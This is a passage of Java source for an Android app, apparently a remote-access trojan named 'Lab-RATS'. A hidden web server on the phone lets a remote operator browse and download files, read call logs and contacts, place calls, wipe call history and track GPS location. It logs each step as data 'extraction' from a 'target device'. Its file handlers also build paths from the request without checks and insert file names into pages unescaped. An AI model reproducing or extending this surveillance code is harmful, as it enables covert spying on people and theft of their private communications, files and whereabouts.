        html.append("<h2 style=\"margin-bottom: 20px;\">Device Information</h2>");
        html.append(DeviceInfo.getDeviceInfoHtml(context));
        html.append("</div>");

        html.append(HTML_FOOTER);
        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serveFiles(String uri, Map<String, String> params) {
        String path = uri.equals("/files") ? "" : uri.substring(7);
        path = path.replace("%20", " ");

        File baseDir = Environment.getExternalStorageDirectory();
        File currentDir = new File(baseDir, path);

        if (!currentDir.exists()) {
            return serve404();
        }

        if (currentDir.isFile()) {
            return serveFileDownload(currentDir);
        }

        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"back-btn-container\">");
        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
        html.append("</div>");

        // Breadcrumb Trail
        html.append("<div class=\"breadcrumb\" style=\"margin-top: 30px;\">");
        html.append("<span style=\"color: var(--neon-green); margin-right: 10px;\">root@UPLINK:~$</span>");
        html.append("<a href=\"/files\">storage</a>");

        if (!path.isEmpty()) {
            String[] parts = path.split("/");
            StringBuilder pathBuilder = new StringBuilder();
            for (String part : parts) {
                if (!part.isEmpty()) {
                    pathBuilder.append("/").append(part);
                    html.append("<span>/</span>");
                    html.append("<a href=\"/files").append(pathBuilder).append("\">").append(part.toLowerCase()).append("</a>");
                }
            }
        }
        html.append("<span style=\"margin-left: 10px; color: var(--neon-cyan); animation: blink 1s infinite;\">_</span>");
        html.append("</div>");

        html.append("<div class=\"card\">");
        html.append("<div style=\"display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; border-bottom: 1px solid rgba(0, 242, 255, 0.1); padding-bottom: 15px;\">");
        html.append("<h2 style=\"margin-bottom: 0; font-size: 1.2rem;\">")
            .append(path.isEmpty() ? "SYSTEM_STORAGE" : "DIR: " + currentDir.getName().toUpperCase())
            .append("</h2>");
        html.append("<span style=\"font-size: 0.7rem; color: var(--neon-green); opacity: 0.8;\">MODE: SECURE_ACCESS</span>");
        html.append("</div>");

        // --- ADD SEARCH & FILTERS ---
        html.append("<div style=\"margin-bottom: 25px;\">");
        html.append("<input type=\"text\" id=\"file-search\" placeholder=\"SEARCH_FILES_OR_EXTENSIONS...\" onkeyup=\"filterFiles()\" style=\"width:100%; max-width:450px; display:block; margin:0 auto 15px auto; background:rgba(0,0,0,0.5); border:1px solid var(--neon-cyan); color:white; padding:15px; border-radius:12px; font-family:monospace;\">");
        html.append("<div style=\"display:flex; gap:8px; flex-wrap:wrap; justify-content:center;\">");
        html.append("<button onclick=\"setFilter('all')\" class=\"btn btn-small\" style=\"border-color:var(--neon-cyan); color:var(--neon-cyan);\">ALL</button>");
        html.append("<button onclick=\"setFilter('JPG,PNG,WEBP')\" class=\"btn btn-small\">IMAGES</button>");
        html.append("<button onclick=\"setFilter('MP4,MOV')\" class=\"btn btn-small\">VIDEO</button>");
        html.append("<button onclick=\"setFilter('PDF,DOC,TXT')\" class=\"btn btn-small\">DOCS</button>");
        html.append("</div></div>");
        
        html.append("<script>");
        html.append("function filterFiles() {");
        html.append("  const val = document.getElementById('file-search').value.toLowerCase();");
        html.append("  document.querySelectorAll('.file-item').forEach(item => {");
        html.append("    const name = item.querySelector('.file-name').textContent.toLowerCase();");
        html.append("    item.style.display = name.includes(val) ? 'flex' : 'none';");
        html.append("  });");
        html.append("}");
        html.append("function setFilter(exts) {");
        html.append("  if(exts === 'all') { document.querySelectorAll('.file-item').forEach(i => i.style.display = 'flex'); return; }");
        html.append("  const list = exts.split(',');");
        html.append("  document.querySelectorAll('.file-item').forEach(item => {");
        html.append("    const name = item.querySelector('.file-name').textContent.toUpperCase();");
        html.append("    const matches = list.some(e => name.endsWith(e));");
        html.append("    item.style.display = matches ? 'flex' : 'none';");
        html.append("  });");
        html.append("}");
        html.append("</script>");

        File[] files = currentDir.listFiles();
        if (files != null && files.length > 0) {
            html.append("<ul class=\"file-list\">");

            // Sort: folders first, then files
            java.util.Arrays.sort(files, (a, b) -> {
                if (a.isDirectory() && !b.isDirectory())
                    return -1;
                if (!a.isDirectory() && b.isDirectory())
                    return 1;
                return a.getName().compareToIgnoreCase(b.getName());
            });

            for (File file : files) {
                String fileName = file.getName();
                String filePath = path.isEmpty() ? fileName : path + "/" + fileName;
                String icon = getFileIcon(file);
                String iconClass = getFileIconClass(file);

                html.append("<li class=\"file-item\">");
                html.append("<div class=\"file-icon ").append(iconClass).append("\">").append(icon).append("</div>");
                html.append("<div class=\"file-info\">");
                html.append("<a class=\"file-name\" href=\"/files/").append(filePath).append("\">").append(fileName).append("</a>");
                
                html.append("<div class=\"file-meta\">");
                if (file.isDirectory()) {
                    File[] subFiles = file.listFiles();
                    int count = subFiles != null ? subFiles.length : 0;
                    html.append("<span style=\"color: #f39c12;\">DIRECTORY</span> &nbsp;|&nbsp; ").append(count).append(" OBJECTS");
                } else {
                    String ext = "";
                    int i = fileName.lastIndexOf('.');
                    if (i > 0) ext = fileName.substring(i+1).toUpperCase();
                    html.append("<span style=\"color: var(--neon-cyan);\">").append(ext.isEmpty() ? "FILE" : ext).append("</span> &nbsp;|&nbsp; ");
                    html.append(formatFileSize(file.length())).append(" &nbsp;|&nbsp; ");
                    html.append(new SimpleDateFormat("MMM dd, yyyy HH:mm", Locale.getDefault()).format(new Date(file.lastModified())));
                }
                html.append("</div></div>");

                if (file.isFile()) {
                    String lowerName = fileName.toLowerCase();
                    if (lowerName.endsWith(".txt") || lowerName.endsWith(".json") || lowerName.endsWith(".log") || 
                        lowerName.endsWith(".xml") || lowerName.endsWith(".html") || lowerName.endsWith(".js") || lowerName.endsWith(".css")) {
                        html.append("<a class=\"btn btn-small\" style=\"margin-right:8px; border-color:var(--neon-orange); color:var(--neon-orange); background:rgba(255,157,0,0.05);\" href=\"/files/edit/").append(filePath).append("\">EDIT</a>");
                    }
                    html.append("<a class=\"btn btn-small\" href=\"/download/").append(filePath)
                            .append("\">GET</a>");
                }

                html.append("</li>");
            }
            html.append("</ul>");
        } else {
            html.append(
                    "<div class=\"empty-state\"><div class=\"icon\">&#128237;</div><p>This folder is empty</p></div>");
        }

        html.append("</div>");
        html.append(HTML_FOOTER);

        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serveFileDownload(File file) {
        try {
            logActivity("DATA_EXTRACT: File fetched - " + file.getName());
            FileInputStream fis = new FileInputStream(file);
            String mimeType = getMimeType(file.getName());
            Response response = newFixedLengthResponse(Response.Status.OK, mimeType, fis, file.length());
            response.addHeader("Content-Disposition", "attachment; filename=\"" + file.getName() + "\"");
            return response;
        } catch (Exception e) {
            return serveError("Cannot read file: " + e.getMessage());
        }
    }

    private Response serveDownload(String uri) {
        String path = uri.substring(10);
        path = path.replace("%20", " ");
        File baseDir = Environment.getExternalStorageDirectory();
        File file = new File(baseDir, path);

        if (!file.exists() || !file.isFile()) {
            return serve404();
        }

        return serveFileDownload(file);
    }

    private Response serveCallLogs(Map<String, String> params) {
        logActivity("COMMS_EXTRACT: Call history retrieved");
        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"back-btn-container\">");
        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
        html.append("</div>");
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 20px;\">Recent Call Logs</h2>");

        // --- REMOTE DIALER SECTION ---
        html.append("<div style=\"background: rgba(0, 242, 255, 0.05); padding: 20px; border: 1px solid var(--neon-cyan); border-radius: 8px; margin-bottom: 30px;\">");
        html.append("<h3 style=\"font-size: 1rem; margin-bottom: 15px; text-align: center;\">&#128222; Remote Dialer</h3>");
        html.append("<form action=\"/calls/make\" method=\"get\">");
        html.append("<div style=\"display: flex; flex-direction: column; gap: 10px; align-items: center;\">");
        html.append("<input type=\"text\" name=\"number\" placeholder=\"Target Phone Number\" style=\"width:100%; max-width:450px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 10px; border-radius: 8px; font-family: 'JetBrains Mono', monospace;\">");
        html.append("<button type=\"submit\" style=\"align-self: center;\">INITIATE CALL</button>");
        html.append("</div></form>");
        
        html.append("<div style=\"margin-top: 20px; text-align: center;\">");
        html.append("<button onclick=\"if(confirm('Wipe device call history?')) location.href='/calls/clear'\" class=\"btn btn-small\" style=\"border-color: var(--danger); color: var(--danger);\">WIPE_HISTORY</button>");
        html.append("</div></div>");

        // Check permission first
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
                html.append("<p>Call log permission not granted.</p>");
                html.append(
                        "<p style=\"margin-top: 10px; font-size: 0.9rem;\">Please grant the permission in the app settings.</p>");
                html.append("</div>");
                html.append("</div>");
                html.append(HTML_FOOTER);
                return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
            }
        }

        // Pagination
        int page = 1;
        int limit = 50;
        try {
            if (params.containsKey("page")) {
                page = Integer.parseInt(params.get("page"));
                if (page < 1)
                    page = 1;
            }
        } catch (Exception e) {
            page = 1;
        }
        int offset = (page - 1) * limit;

        Cursor cursor = null;
        try {
            // Query for call logs - compatible with Android 13+
            String[] projection = new String[] {
                    CallLog.Calls._ID,
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.CACHED_NAME,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.DATE,
                    CallLog.Calls.DURATION
            };

            String sortOrder = CallLog.Calls.DATE + " DESC";

            cursor = context.getContentResolver().query(
                    CallLog.Calls.CONTENT_URI,
                    projection,
                    null,
                    null,
                    sortOrder);

            if (cursor != null && cursor.getCount() > 0) {
                int totalCount = cursor.getCount();
                int totalPages = (int) Math.ceil((double) totalCount / limit);

                html.append("<p style=\"color: #888; margin-bottom: 15px;\">Total: ").append(totalCount)
                        .append(" calls | Page ").append(page).append(" of ").append(totalPages).append("</p>");

                html.append("<div style=\"overflow-x: auto;\">");
                html.append("<table>");
                html.append("<thead><tr>");
                html.append("<th>Type</th><th>Contact</th><th>Number</th><th>Date</th><th>Duration</th><th>Action</th>");
                html.append("</tr></thead><tbody>");

                int count = 0;
                int skipped = 0;

                while (cursor.moveToNext()) {
                    // Skip to offset
                    if (skipped < offset) {
                        skipped++;
                        continue;
                    }

                    // Limit results
                    if (count >= limit)
                        break;

                    int idIdx = cursor.getColumnIndex(CallLog.Calls._ID);
                    int numberIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                    int nameIdx = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
                    int typeIdx = cursor.getColumnIndex(CallLog.Calls.TYPE);
                    int dateIdx = cursor.getColumnIndex(CallLog.Calls.DATE);
                    int durationIdx = cursor.getColumnIndex(CallLog.Calls.DURATION);

                    String number = numberIdx >= 0 ? cursor.getString(numberIdx) : "Unknown";
                    String name = nameIdx >= 0 ? cursor.getString(nameIdx) : null;
                    int type = typeIdx >= 0 ? cursor.getInt(typeIdx) : 0;
                    long date = dateIdx >= 0 ? cursor.getLong(dateIdx) : 0;
                    int duration = durationIdx >= 0 ? cursor.getInt(durationIdx) : 0;

                    String typeIcon, typeClass;
                    switch (type) {
                        case CallLog.Calls.INCOMING_TYPE:
                            typeIcon = "&#8595; In";
                            typeClass = "call-incoming";
                            break;
                        case CallLog.Calls.OUTGOING_TYPE:
                            typeIcon = "&#8593; Out";
                            typeClass = "call-outgoing";
                            break;
                        case CallLog.Calls.MISSED_TYPE:
                            typeIcon = "&#10006; Missed";
                            typeClass = "call-missed";
                            break;
                        case CallLog.Calls.REJECTED_TYPE:
                            typeIcon = "&#10006; Rejected";
                            typeClass = "call-missed";
                            break;
                        case CallLog.Calls.BLOCKED_TYPE:
                            typeIcon = "&#128683; Blocked";
                            typeClass = "call-missed";
                            break;
                        default:
                            typeIcon = "&#128222; Other";
                            typeClass = "";
                    }

                    html.append("<tr>");
                    html.append("<td class=\"").append(typeClass).append("\">").append(typeIcon).append("</td>");
                    html.append("<td>").append(name != null && !name.isEmpty() ? escapeHtml(name) : "-")
                            .append("</td>");
                    html.append("<td>").append(number != null ? escapeHtml(number) : "Unknown").append("</td>");
                    html.append("<td>").append(
                            new SimpleDateFormat("MMM dd, yyyy HH:mm", Locale.getDefault()).format(new Date(date)))
                            .append("</td>");
                    html.append("<td>").append(formatDuration(duration)).append("</td>");
                    html.append("<td>");
                    if (number != null && !number.equals("Unknown")) {
                        html.append("<a href=\"/calls/make?number=").append(Uri.encode(number)).append("\" class=\"btn btn-small\" style=\"border-color: var(--neon-green); color: var(--neon-green); background: rgba(57, 255, 20, 0.05); min-width: 0; padding: 5px 10px;\">CALL</a>");
                    }
                    html.append("</td>");
                    html.append("</tr>");

                    count++;
                }

                html.append("</tbody></table>");
                html.append("</div>");

                // Pagination links
                if (totalPages > 1) {
                    html.append("<div class=\"pagination\" style=\"flex-direction: column; gap: 15px;\">");

                    html.append("<div style=\"display: flex; gap: 5px; justify-content: center; flex-wrap: wrap;\">");
                    if (page > 1) {
                        html.append("<a href=\"/calls?page=1\">First</a>");
                        html.append("<a href=\"/calls?page=").append(page - 1).append("\">&#8592; Prev</a>");
                    }

                    int startPage = Math.max(1, page - 2);
                    int endPage = Math.min(totalPages, page + 2);

                    for (int i = startPage; i <= endPage; i++) {
                        String active = (i == page) ? "class=\"active\"" : "";
                        html.append("<a ").append(active).append(" href=\"/calls?page=").append(i).append("\">").append(i).append("</a>");
                    }

                    if (page < totalPages) {
                        html.append("<a href=\"/calls?page=").append(page + 1).append("\">Next &#8594;</a>");
                        html.append("<a href=\"/calls?page=").append(totalPages).append("\">Last</a>");
                    }
                    html.append("</div>");

                    // Jump to page box
                    html.append("<form action=\"/calls\" method=\"get\" style=\"display: flex; gap: 10px; justify-content: center; align-items: center;\">");
                    html.append("<span style=\"font-size: 0.8rem; color: #888;\">Jump to:</span>");
                    html.append("<input type=\"number\" name=\"page\" min=\"1\" max=\"").append(totalPages).append("\" value=\"").append(page).append("\" style=\"width: 60px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 5px; border-radius: 8px; text-align: center;\">");
                    html.append("<button type=\"submit\" class=\"btn btn-small\">GO</button>");
                    html.append("</form>");

                    html.append("</div>");
                }
            } else {
                html.append(
                        "<div class=\"empty-state\"><div class=\"icon\">&#128222;</div><p>No call logs found</p></div>");
            }
        } catch (SecurityException e) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
            html.append("<p>Permission denied.</p>");
            html.append("<p style=\"margin-top: 10px; font-size: 0.9rem;\">Error: ").append(escapeHtml(e.getMessage()))
                    .append("</p>");
            html.append("</div>");
        } catch (Exception e) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div>");
            html.append("<p>Error loading call logs</p>");
            html.append("<p style=\"margin-top: 10px; font-size: 0.9rem;\">").append(escapeHtml(e.getMessage()))
                    .append("</p>");
            html.append("</div>");
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }

        html.append("</div>");
        html.append(HTML_FOOTER);

        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serveContacts(Map<String, String> params) {
        logActivity("CONTACT_EXTRACT: Address book retrieved");
        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"back-btn-container\">");
        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
        html.append("</div>");
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 20px;\">Contacts</h2>");

        // Check permission first
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
                html.append("<p>Contacts permission not granted.</p>");
                html.append(
                        "<p style=\"margin-top: 10px; font-size: 0.9rem;\">Please grant the permission in the app settings.</p>");
                html.append("</div>");
                html.append("</div>");
                html.append(HTML_FOOTER);
                return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
            }
        }

        // Pagination
        int page = 1;
        int limit = 50;
        try {
            if (params.containsKey("page")) {
                page = Integer.parseInt(params.get("page"));
                if (page < 1)
                    page = 1;
            }
        } catch (Exception e) {
            page = 1;
        }
        int offset = (page - 1) * limit;

        Cursor cursor = null;
        try {
            cursor = context.getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    new String[] {
                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                            ContactsContract.CommonDataKinds.Phone.NUMBER
                    },
                    null, null,
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");

            if (cursor != null && cursor.getCount() > 0) {
                java.util.Map<String, String> uniqueContacts = new java.util.LinkedHashMap<>();
                while (cursor.moveToNext()) {
                    String name = cursor.getString(0);
                    String number = cursor.getString(1);
                    if (number == null) continue;
                    String normalized = number.replaceAll("[^0-9+]", "");
                    if (!uniqueContacts.containsKey(normalized)) {
                        uniqueContacts.put(normalized, name);
                    }
                }

                int totalCount = uniqueContacts.size();
                int totalPages = (int) Math.ceil((double) totalCount / limit);

                html.append("<p style=\"color: #888; margin-bottom: 15px;\">Total: ").append(totalCount)
                        .append(" contacts | Page ").append(page).append(" of ").append(totalPages).append("</p>");

                html.append("<div style=\"overflow-x: auto;\">");
                html.append("<table>");
                html.append("<thead><tr>");
                html.append("<th>Name</th><th>Phone Number</th>");
                html.append("</tr></thead><tbody>");

                int count = 0;
                int itemIndex = 0;

                for (java.util.Map.Entry<String, String> entry : uniqueContacts.entrySet()) {
                    if (itemIndex < offset) {
                        itemIndex++;
                        continue;
                    }

                    if (count >= limit)
                        break;

                    String number = entry.getKey();
                    String name = entry.getValue();

                    html.append("<tr>");
                    html.append("<td>");
                    html.append("<span>").append(name != null ? escapeHtml(name) : "Unknown").append("</span>");
                    html.append("</td>");
                    html.append("<td>").append(number).append("</td>");
                    html.append("</tr>");

                    count++;
                    itemIndex++;
                }

                html.append("</tbody></table>");
                html.append("</div>");

                // Pagination links
                if (totalPages > 1) {
                    html.append("<div class=\"pagination\" style=\"flex-direction: column; gap: 15px;\">");

                    html.append("<div style=\"display: flex; gap: 5px; justify-content: center; flex-wrap: wrap;\">");
                    if (page > 1) {
                        html.append("<a href=\"/contacts?page=1\">First</a>");
                        html.append("<a href=\"/contacts?page=").append(page - 1).append("\">&#8592; Prev</a>");
                    }

                    int startPage = Math.max(1, page - 2);
                    int endPage = Math.min(totalPages, page + 2);

                    for (int i = startPage; i <= endPage; i++) {
                        String active = (i == page) ? "class=\"active\"" : "";
                        html.append("<a ").append(active).append(" href=\"/contacts?page=").append(i).append("\">").append(i).append("</a>");
                    }

                    if (page < totalPages) {
                        html.append("<a href=\"/contacts?page=").append(page + 1).append("\">Next &#8594;</a>");
                        html.append("<a href=\"/contacts?page=").append(totalPages).append("\">Last</a>");
                    }
                    html.append("</div>");

                    // Jump to page box
                    html.append("<form action=\"/contacts\" method=\"get\" style=\"display: flex; gap: 10px; justify-content: center; align-items: center;\">");
                    html.append("<span style=\"font-size: 0.8rem; color: #888;\">Jump to:</span>");
                    html.append("<input type=\"number\" name=\"page\" min=\"1\" max=\"").append(totalPages).append("\" value=\"").append(page).append("\" style=\"width: 60px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 5px; border-radius: 8px; text-align: center;\">");
                    html.append("<button type=\"submit\" class=\"btn btn-small\">GO</button>");
                    html.append("</form>");

                    html.append("</div>");
                }
            } else {
                html.append(
                        "<div class=\"empty-state\"><div class=\"icon\">&#128101;</div><p>No contacts found</p></div>");
            }
        } catch (SecurityException e) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
            html.append("<p>Permission denied.</p>");
            html.append("<p style=\"margin-top: 10px; font-size: 0.9rem;\">Error: ").append(escapeHtml(e.getMessage()))
                    .append("</p>");
            html.append("</div>");
        } catch (Exception e) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div>");
            html.append("<p>Error loading contacts</p>");
            html.append("<p style=\"margin-top: 10px; font-size: 0.9rem;\">").append(escapeHtml(e.getMessage()))
                    .append("</p>");
            html.append("</div>");
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }

        html.append("</div>");
        html.append(HTML_FOOTER);

        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serve404() {
        String html = HTML_HEADER +
                "<div class=\"card\">" +
                "<div class=\"empty-state\">" +
                "<div class=\"icon\">&#128269;</div>" +
                "<h2 style=\"margin-bottom: 10px;\">Page Not Found</h2>" +
                "<p>The requested page does not exist.</p>" +
                "<a href=\"/\" style=\"display: inline-block; margin-top: 20px; padding: 12px 24px; background: linear-gradient(135deg, #e94560, #ff6b6b); border-radius: 10px; color: white; text-decoration: none;\">Go Home</a>"
                +
                "</div>" +
                "</div>" +
                HTML_FOOTER;
        return newFixedLengthResponse(Response.Status.NOT_FOUND, "text/html", html);
    }

    private Response serveError(String message) {
        String html = HTML_HEADER +
                "<div class=\"card\">" +
                "<div class=\"empty-state\">" +
                "<div class=\"icon\">&#9888;</div>" +
                "<h2 style=\"margin-bottom: 10px;\">Error</h2>" +
                "<p>" + escapeHtml(message) + "</p>" +
                "</div>" +
                "</div>" +
                HTML_FOOTER;
        return newFixedLengthResponse(Response.Status.INTERNAL_ERROR, "text/html", html);
    }


    private Response serveGpsPage() {
        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"back-btn-container\">");
        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
        html.append("</div>");
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 20px;\">&#128205; GPS Satellite Uplink</h2>");
        html.append("<p style=\"color: #888; margin-bottom: 25px;\">Active tracking and coordinate extraction for the target device.</p>");
        
        // Map Container
        html.append("<div id=\"map-container\" style=\"width: 100%; height: 450px; background: #000; border: 1px solid var(--neon-cyan); border-radius: 8px; margin-bottom: 25px; overflow: hidden; position: relative;\">");
        html.append("<div id=\"map-overlay\" style=\"position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; background: rgba(0,0,0,0.8); z-index: 5;\">");
        html.append("<div style=\"text-align: center;\"><div style=\"font-size: 2rem; margin-bottom: 10px;\">&#128225;</div><div style=\"color: var(--neon-cyan); letter-spacing: 2px;\">AWAITING_SATELLITE_FIX</div></div>");
        html.append("</div>");
        html.append("<iframe id=\"map-frame\" width=\"100%\" height=\"100%\" frameborder=\"0\" style=\"border:0; filter: invert(90%) hue-rotate(180deg); display: none;\" allowfullscreen></iframe>");
        html.append("</div>");

        html.append("<div class=\"btn-container\" style=\"margin-bottom: 30px;\">");
        html.append("<button onclick=\"locateDevice()\" class=\"btn\">&#128205; PING_LOCATION</button>");
        html.append("<button id=\"ext-map-btn\" onclick=\"openExternalMap()\" class=\"btn\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); display: none;\">&#128640; OPEN_MAPS</button>");
        html.append("</div>");
        
        html.append("<div class=\"info-item\" style=\"margin-bottom: 25px;\">");
        html.append("<div class=\"info-label\">COORD_SYSTEM</div>");
        html.append("<div id=\"coord-display\" class=\"info-value\">WAITING_FOR_DATA...</div>");
        html.append("</div>");

        html.append("<div style=\"padding: 20px; background: rgba(0,0,0,0.3); border: 1px solid rgba(0, 242, 255, 0.1);\">");
        html.append("<h3 style=\"font-size: 0.8rem; opacity: 0.7;\">LOCATION_STREAM</h3>");
        html.append("<div id=\"gps-log\" style=\"color: var(--terminal-green); font-size: 0.75rem; font-family: 'JetBrains Mono', monospace; line-height: 1.5;\">");
        html.append("<div>[SYSTEM] Tracker standby...</div>");
        html.append("</div></div>");

        html.append("<script>");
        html.append("var currentLat = 0; var currentLon = 0;");
        html.append("function addLog(msg) {");
        html.append("  const log = document.getElementById('gps-log');");
        html.append("  const div = document.createElement('div');");
        html.append("  div.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;");
        html.append("  log.insertBefore(div, log.firstChild);");
        html.append("}");
        html.append("function locateDevice() {");
        html.append("  addLog('[REQUEST] Pinging satellites...');");
        html.append("  fetch('/gps/locate?json=true').then(r => r.json()).then(data => {");
        html.append("    if (data.success) {");
        html.append("      currentLat = data.lat; currentLon = data.lon;");
        html.append("      document.getElementById('coord-display').innerHTML = 'LAT: ' + data.lat + ' | LON: ' + data.lon;");
        html.append("      addLog('[SUCCESS] Fix acquired: ' + data.lat + ', ' + data.lon);");
        html.append("      const frame = document.getElementById('map-frame');");
        html.append("      const overlay = document.getElementById('map-overlay');");
        html.append("      const extBtn = document.getElementById('ext-map-btn');");
        // Using OpenStreetMap export embed for cleaner iframe support without API keys
        html.append("      frame.src = 'https://www.openstreetmap.org/export/embed.html?bbox=' + (data.lon-0.01) + ',' + (data.lat-0.01) + ',' + (data.lon+0.01) + ',' + (data.lat+0.01) + '&layer=mapnik&marker=' + data.lat + ',' + data.lon;");
        html.append("      frame.style.display = 'block';");
        html.append("      overlay.style.display = 'none';");
        html.append("      extBtn.style.display = 'inline-block';");
        html.append("    } else {");
        html.append("      addLog('[ERROR] ' + data.message);");
        html.append("      alert(data.message);");
        html.append("    }");
        html.append("  }).catch(err => {");
        html.append("    addLog('[FATAL] Network error during triangulation');");
        html.append("  });");
        html.append("}");
        html.append("function openExternalMap() {");
        html.append("  window.open('https://www.google.com/maps/search/?api=1&query=' + currentLat + ',' + currentLon, '_blank');");
        html.append("}");
        html.append("</script>");
        
        html.append("</div>");
        html.append(HTML_FOOTER);
        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serveGpsLocate(Map<String, String> params) {
        logActivity("LOCATE_TRIGGER: Precision GPS uplink initiated");
        boolean hasFineLocation = ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED;
        boolean hasCoarseLocation = ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED;

        if (!hasFineLocation && !hasCoarseLocation) {
            return params.containsKey("json") ?
                    newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false, \"message\": \"Location permission not granted. Please ensure location permissions are allowed in app settings.\"}") :
                    serveError("Location permission not granted. Please ensure location permissions are allowed in app settings.");
        }

        try {
            LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            Location location = null;

            // Try to get fresh location if on Android 11+
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                // This is a blocking call for a short time, but we are in a NanoHTTPD worker thread
                final java.util.concurrent.CompletableFuture<Location> future = new java.util.concurrent.CompletableFuture<>();
                if (hasFineLocation) {
                    locationManager.getCurrentLocation(
                            LocationManager.GPS_PROVIDER,
                            null,
                            ContextCompat.getMainExecutor(context),
                            future::complete);
                } else {
                    locationManager.getCurrentLocation(
                            LocationManager.NETWORK_PROVIDER,
                            null,
                            ContextCompat.getMainExecutor(context),
                            future::complete);
                }
                
                try {
                    location = future.get(5, java.util.concurrent.TimeUnit.SECONDS);
                } catch (Exception e) {
                    Log.e("Lab-RATS", "Error getting current location: " + e.getMessage());
                }
            }

            // Fallback to LastKnownLocation if getCurrentLocation failed or not available
            if (location == null) {
                // Try GPS first
                if (hasFineLocation && locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                    location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                }

                // Try Network as fallback
                if (location == null && locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                    location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                }

                // Try Passive as last resort
                if (location == null) {
                    location = locationManager.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER);
                }
            }

            if (location != null) {
                double lat = location.getLatitude();
                double lon = location.getLongitude();
                
                // --- UPDATE DECOY CITY ---
                try {
                    android.location.Geocoder geocoder = new android.location.Geocoder(context, Locale.getDefault());
                    List<android.location.Address> addresses = geocoder.getFromLocation(lat, lon, 1);
                    if (addresses != null && !addresses.isEmpty()) {
                        String city = addresses.get(0).getLocality();
                        if (city != null) {
                            context.getSharedPreferences("LabRATSSettings", Context.MODE_PRIVATE)
                                .edit().putString("last_city", city).apply();
                        }
                    }
                } catch (Exception e) {
                    Log.e("LabRATS", "Geocoder failed: " + e.getMessage());
                }

                if (params.containsKey("json")) {
                    String json = String.format(Locale.US, "{\"success\": true, \"lat\": %f, \"lon\": %f, \"provider\": \"%s\", \"accuracy\": %f, \"time\": %d}",
                            lat, lon, location.getProvider(), location.getAccuracy(), location.getTime());
                    return newFixedLengthResponse(Response.Status.OK, "application/json", json);
                }

                String mapsUrl = "https://www.google.com/maps/search/?api=1&query=" + lat + "," + lon;
                Response response = newFixedLengthResponse(Response.Status.REDIRECT, "text/html", "");
                response.addHeader("Location", mapsUrl);
                return response;
            } else {
                String errorMsg = "Could not retrieve location. Ensure GPS/Location is enabled on the device and has a clear view of the sky.";
                if (!locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER) && !locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                    errorMsg = "Location services are DISABLED on the device. Please enable them.";
                }
                
                return params.containsKey("json") ?
                        newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false, \"message\": \"" + errorMsg + "\"}") :
                        serveError(errorMsg);
            }
        } catch (SecurityException e) {
            return params.containsKey("json") ?
                    newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false, \"message\": \"Permission denied: " + e.getMessage() + "\"}") :
